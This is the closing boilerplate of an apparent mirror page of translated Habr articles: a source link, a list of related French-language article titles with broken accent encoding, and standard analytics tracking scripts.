</div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr436136/">https://habr.com/ru/post/fr436136/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr436126/index.html">Kubernetes: cr√©ation d'images Docker dans un cluster</a></li>
<li><a href="../fr436128/index.html">Entretien avec le chasseur de bagages Artyom Moscou. Il a pirat√© Steam et a re√ßu le plus grand prix de l'histoire de Valve.</a></li>
<li><a href="../fr436130/index.html">Le projet du minist√®re des t√©l√©communications et des communications de masse sur le transfert du trafic Internet via les stations russes complique la l√©galisation de OneWeb en Russie</a></li>
<li><a href="../fr436132/index.html">12 choses √©tranges qui peuvent arriver apr√®s l'installation du paquet npm</a></li>
<li><a href="../fr436134/index.html">Jusqu'√† 20% de droits de barrage seront impos√©s sur les routeurs d'importation</a></li>
<li><a href="../fr436140/index.html">¬´Sous le capot¬ª du stockage Huawei: les technologies propri√©taires et ce que les autres n'ont pas</a></li>
<li><a href="../fr436144/index.html">Patrons suceurs de sang dans le contexte d'une bioc√©nose: pourquoi une √©quipe autonome se d√©sagr√®ge si elle n'est pas centralis√©e</a></li>
<li><a href="../fr436148/index.html">L'histoire d'un junior - comment commencer √† travailler et ne pas avoir peur de tout</a></li>
<li><a href="../fr436150/index.html">Configurer le transfert de donn√©es d'appareil vers AWS IoT Core</a></li>
<li><a href="../fr436152/index.html">L'erreur qui m'a appris le design orient√© business</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>